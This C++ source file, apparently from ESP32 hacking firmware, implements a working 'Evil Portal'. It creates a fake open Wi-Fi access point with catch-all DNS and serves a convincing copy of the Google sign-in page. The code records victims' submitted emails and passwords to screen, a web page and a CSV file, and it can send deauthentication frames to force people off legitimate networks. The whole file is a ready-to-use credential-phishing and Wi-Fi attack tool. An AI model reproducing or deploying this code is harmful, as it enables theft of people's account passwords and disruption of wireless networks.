#include "core/globals.h"
#include "core/mykeyboard.h"
#include "core/wifi_common.h"
#include "core/sd_functions.h"
#include "evil_portal.h"
#include "wifi_atks.h"

WebServer* ep= nullptr;               // initialise webserver
DNSServer dnsServer;

String html_file, last_cred;
String output_file = "creds.csv";
String AP_name = "Free Wifi";
int totalCapturedCredentials = 0;
int previousTotalCapturedCredentials = -1;  // stupid hack but wtfe
String capturedCredentialsHtml = "";

void handleCreds() {
    String html_temp = "<li>";
    String csvLine = "";
    last_cred="";
    for (int i = 0; i < ep->args(); i++) {
        String tmp=ep->argName(i);
        if(tmp=="q" || tmp.startsWith("cup2") || tmp.startsWith("plain") || tmp=="P1" || tmp=="P2" || tmp=="P3" || tmp=="P4") continue;
        else {
            html_temp += ep->argName(i) + ": " + ep->arg(i) + "<br>\n";
            // Prepara dados para salvar no SD
            if (i != 0) csvLine += ",";
            csvLine += ep->argName(i) + ": " + ep->arg(i);
            last_cred += ep->argName(i).substring(0,3) + ": " + ep->arg(i) + "\n";
        }
    }
    html_temp += "</li>\n";
    saveToCSV(csvLine);
    capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
    totalCapturedCredentials++;
    ep->send(200, "text/html", getHtmlContents("Please, Wait a few minutes. Soon you'll be able to access internet."));
}

void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
    int tmp=millis(); // one deauth frame each 30ms at least
    bool redraw=true;
    // Definição da matriz "Options"
    options = {
        {"Default", [=]()       { chooseHtml(false); }},
        {"Custom Html", [=]()   { chooseHtml(true); }},
        {"Main Menu", [=]() { backToMenu(); }}
    };
    delay(200);
    loopOptions(options);
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    wsl_bypasser_send_raw_frame(&ap_record,channel); //writes the buffer with the information
    while(checkNextPress()){ yield(); } // debounce

    if(!returnToMenu) {
        //  tssid="" means that are opening a virgin Evil Portal
        if (tssid=="")  {
          AP_name = keyboard("Free Wifi", 30, "Evil Portal SSID:");
          }
        else { // tssid != "" means that is was cloned and can deploy Deauth
          AP_name = tssid;
        }

        bool defaultIP=true;
        options = {
            {"172.0.0.1",   [&]()   { defaultIP=true; }},
            {"192.168.4.1", [&]()   { defaultIP=false; }},
        };
        delay(200);
        loopOptions(options);

        wifiConnected=true;
        drawMainBorder();
        displayRedStripe("Starting..",TFT_WHITE,bruceConfig.priColor);
        WiFi.mode(WIFI_MODE_AP);
        if(defaultIP) {
          IPAddress AP_GATEWAY(172, 0, 0, 1);
          WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
          WiFi.softAP(AP_name,emptyString,channel);
        } else {
          IPAddress AP_GATEWAY(192, 168, 4, 1);
          WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
          WiFi.softAP(AP_name,emptyString,channel);
        }

        tmp=millis();
        while(millis() - tmp < 3000) yield();

        if(psramFound()) ep=(WebServer*)ps_malloc(sizeof(WebServer));
        else ep=(WebServer*)malloc(sizeof(WebServer));

        new (ep) WebServer(80);

        ep->on("/", [](){
          ep->send(200, "text/html", html_file);
        });
        ep->on("/post", handleCreds);

        ep->onNotFound([](){
          if (ep->args()>0) {
            handleCreds();
          } else {
            ep->send(200, "text/html", html_file);
          }
        });

        ep->on("/creds", []() {
          ep->send(200, "text/html", creds_GET());
        });

        ep->on("/ssid", []() {
          ep->send(200, "text/html", ssid_GET());
        });

        ep->on("/postssid", [](){
          if(ep->hasArg("ssid")) AP_name = ep->arg("ssid").c_str();
          ep->send(200, "text/html", ssid_POST());
          ep->stop();                            // pára o servidor
          wifiDisconnect();                     // desliga o WiFi
          WiFi.softAP(AP_name);                 // reinicia WiFi com novo SSID
          ep->begin();                          // reinicia o servidor
          previousTotalCapturedCredentials=-1;  // redesenha a tela
        });

        dnsServer.start(53, "*", WiFi.softAPIP());
        ep->begin();

        bool hold_deauth = false;
        tmp=millis(); // one deauth frame each 30ms at least
        redraw=true;
        while(1) {
          if(redraw) {
            drawMainBorder();

            tft.setTextSize(FM);
            tft.setTextColor(TFT_RED);
            tft.drawCentreString("Evil Portal",tft.width()/2, 29, SMOOTH_FONT);
            tft.setCursor(8,46);
            tft.setTextColor(bruceConfig.priColor);
            tft.println("AP: " + AP_name.substring(0,15));
            tft.setCursor(8,tft.getCursorY());
            tft.println("->" + WiFi.softAPIP().toString() + "/creds");
            tft.setCursor(8,tft.getCursorY());
            tft.println("->" + WiFi.softAPIP().toString() + "/ssid");
            tft.setCursor(8,tft.getCursorY());
            tft.print("Victims: ");
            tft.setTextColor(TFT_RED);
            tft.println(String(totalCapturedCredentials));
            tft.setCursor(8,tft.getCursorY());
            tft.setTextSize(FP);
            tft.println(last_cred.substring(0,last_cred.indexOf('\n')));
            tft.setCursor(8,tft.getCursorY());
            tft.println(last_cred.substring(last_cred.indexOf('\n')+1));

            if (deauth){
              if (hold_deauth) {
                tft.setTextSize(FP);
                tft.setTextColor(bruceConfig.priColor);
                tft.drawRightString("Deauth OFF", tft.width()-8,tft.height()-16,SMOOTH_FONT);
              } else {
                tft.setTextSize(FP);
                tft.setTextColor(TFT_RED);
                tft.drawRightString("Deauth ON", tft.width()-8,tft.height()-16,SMOOTH_FONT);
              }
            }

            redraw=false;
          }

          dnsServer.processNextRequest();
          ep->handleClient();

          if(!hold_deauth && (millis()-tmp) >250  && deauth)  {
            send_raw_frame(deauth_frame, 26); // sends deauth frames if needed.
            tmp=millis();
          }

          if(checkSelPress()) {
            while(checkSelPress()) { delay(80); } // timerless debounce
            hold_deauth = !hold_deauth;
            redraw=true;
          }
          if(totalCapturedCredentials!=(previousTotalCapturedCredentials+1)) {
            redraw=true;
            previousTotalCapturedCredentials = totalCapturedCredentials-1;
          }

          if(checkEscPress()) break;
        }
        ep->close();
        ep->~WebServer();
        free(ep);
        ep=nullptr;
        dnsServer.stop();

        delay(100);
        wifiDisconnect();
    }
}

// Função para salvar dados no arquivo CSV
void saveToCSV(const String &csvLine) {
    FS *fs;
    if(!getFsStorage(fs)) {
        log_i("Error getting FS storage");
        return;
    }

    if (!(*fs).exists("/BruceEvilCreds")) (*fs).mkdir("/BruceEvilCreds");
    File file = (*fs).open("/BruceEvilCreds/"+output_file, FILE_APPEND);
    if (!file) {
        log_i("Error to open file");
        return;
    }
    file.println(csvLine);
    file.close();
    log_i("data saved");
}

String getDefaultHtml() {

//  PROGMEM String default_html = "<!DOCTYPE html><html><head><title>Fazer login nas Contas do Google</title><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><style>a:hover{text-decoration: underline;}body{font-family: Arial, sans-serif;align-items: center;justify-content: center;background-color: #FFFFFF;}input[type='text'], input[type='password']{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: border-box;border: 1px solid #cccccc;border-radius: 4px;}.container{margin: auto;padding: 20px;max-width: 700px;}.logo-container{text-align: center;margin-bottom: 30px;display: flex;justify-content: center;align-items: center;}.logo{width: 40px;height: 40px;fill: #FFC72C;margin-right: 100px;}.company-name{font-size: 42px;color: black;margin-left: 0px;}.form-container{background: #FFFFFF;border: 1px solid #CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);}h1{text-align: center;font-size: 28px;font-weight: 500;margin-bottom: 20px;}.input-field{width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius: 4px;margin-bottom: 20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border: none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: #0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: #202124;font-size: 24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px 0px 30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style></head><body><div class='container'><div class='logo-container'><?xml version='1.0' standalone='no'?><!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'></div><div class=form-container><center><div class='containerlogo'><!-- Google Logo --><div id='logo' title='Google'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg></div><!-- /Google Logo --></div></center><div style='min-height: 150px'><center><div class='containertitle'>Fazer login</div><div class='containersubtitle'>Use sua Conta do Google</div></center><form action='/post' id='login-form'><input name='email' class='input-field' type='text' placeholder='E-mail ou telefone' required><input name='password' class='input-field' type='password' placeholder='Digite sua senha' required /><div class='containermsg'><button class='forgot-btn'>Esqueceu sua senha?</button></div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>Avançar</button></div></form></div></div></div></body></html>";
  PROGMEM String default_html = "<!DOCTYPE html><html><head><title>Sign in: Google Accounts</title><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><style>a:hover{text-decoration: underline;}body{font-family: Arial, sans-serif;align-items: center;justify-content: center;background-color: #FFFFFF;}input[type='text'], input[type='password']{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: border-box;border: 1px solid #cccccc;border-radius: 4px;}.container{margin: auto;padding: 20px;max-width: 700px;}.logo-container{text-align: center;margin-bottom: 30px;display: flex;justify-content: center;align-items: center;}.logo{width: 40px;height: 40px;fill: #FFC72C;margin-right: 100px;}.company-name{font-size: 42px;color: black;margin-left: 0px;}.form-container{background: #FFFFFF;border: 1px solid #CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);}h1{text-align: center;font-size: 28px;font-weight: 500;margin-bottom: 20px;}.input-field{width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius: 4px;margin-bottom: 20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border: none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: #0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: #202124;font-size: 24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px 0px 30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style></head><body><div class='container'><div class='logo-container'><?xml version='1.0' standalone='no'?><!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'></div><div class=form-container><center><div class='containerlogo'><!-- Google Logo --><div id='logo' title='Google'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg></div><!-- /Google Logo --></div></center><div style='min-height: 150px'><center><div class='containertitle'>Sign in</div><div class='containersubtitle'>Use your Google Account</div></center><form action='/post' id='login-form'><input name='email' class='input-field' type='text' placeholder='Email or phone' required><input name='password' class='input-field' type='password' placeholder='Enter your password' required /><div class='containermsg'><button class='forgot-btn'>Forgot password?</button></div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>Next</button></div></form></div></div></div></body></html>";
  return default_html;
}

String getHtmlContents(String body) {
  PROGMEM String html =
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "  <title>"+ AP_name + "</title>"
    "  <meta charset='UTF-8'>"
    "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
    "  <style>a:hover{text-decoration: underline;}body{font-family: Arial, sans-serif;align-items: center;justify-content: center;background-color: #FFFFFF;}input[type='text'], input[type='password']{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: border-box;border: 1px solid #cccccc;border-radius: 4px;}.container{margin: auto;padding: 20px;max-width: 700px;}.logo-container{text-align: center;margin-bottom: 30px;display: flex;justify-content: center;align-items: center;}.logo{width: 40px;height: 40px;fill: #FFC72C;margin-right: 100px;}.company-name{font-size: 42px;color: black;margin-left: 0px;}.form-container{background: #FFFFFF;border: 1px solid #CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);}h1{text-align: center;font-size: 28px;font-weight: 500;margin-bottom: 20px;}.input-field{width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius: 4px;margin-bottom: 20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border: none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: #0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: #202124;font-size: 24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px 0px 30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style>"
    "</head>"
    "<body>"
    "  <div class='container'>"
    "    <div class='logo-container'>"
    "      <?xml version='1.0' standalone='no'?>"
    "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
    "    </div>"
    "    <div class=form-container>"
    "      <div style='min-height: 150px'>"
            + body +
    "      </div>"
    "    </div>"
    "  </div>"
    "</body>"
    "</html>";
  return html;
}

String creds_GET() {
  return getHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
}

String ssid_GET() {
  return getHtmlContents("<p>Set a new SSID for Evil Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+AP_name+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
}
String ssid_POST() {
  return getHtmlContents("Evil Portal shutting down and restarting with SSID <b>" + AP_name + "</b>. Please reconnect.");
}

String index_GET() {
  return getDefaultHtml();
}
String clear_GET() {
  String email = "<p></p>";
  String password = "<p></p>";
  capturedCredentialsHtml = "<p></p>";
  if (LittleFS.begin()) if (LittleFS.exists("/Bruce_creds.csv")) LittleFS.remove("/Bruce_creds.csv");
  if (SD.begin()) if (SD.exists("/Bruce_creds.csv")) SD.remove("/Bruce_creds.csv");
  totalCapturedCredentials = 0;
  return getHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
}

void chooseHtml(bool def) {
    FS *fs;
    if(def) {
        if(setupSdCard()) {
            options = {
                {"SD Card",  [&]() { fs=&SD; }},
                {"LittleFS", [&]() { fs=&LittleFS; }},
            };
            delay(200);
            loopOptions(options);
        } else fs=&LittleFS;

        html_file = loopSD(*fs,true);
        if(html_file.endsWith(".html")) {
            String html_name = html_file.substring(html_file.lastIndexOf("/"), html_file.length()-5);
            html_name.toLowerCase();

            File html = (*fs).open(html_file, FILE_READ);
            html_file = html.readString();
            html.close();
            output_file = html_name + "_creds.csv";
        } else {
            html_file = index_GET();
            output_file = "default_creds.csv";
        }
    } else {
        html_file = index_GET();
        output_file = "default_creds.csv";
    }
    Serial.println("Evil Portal output file "+output_file);
}
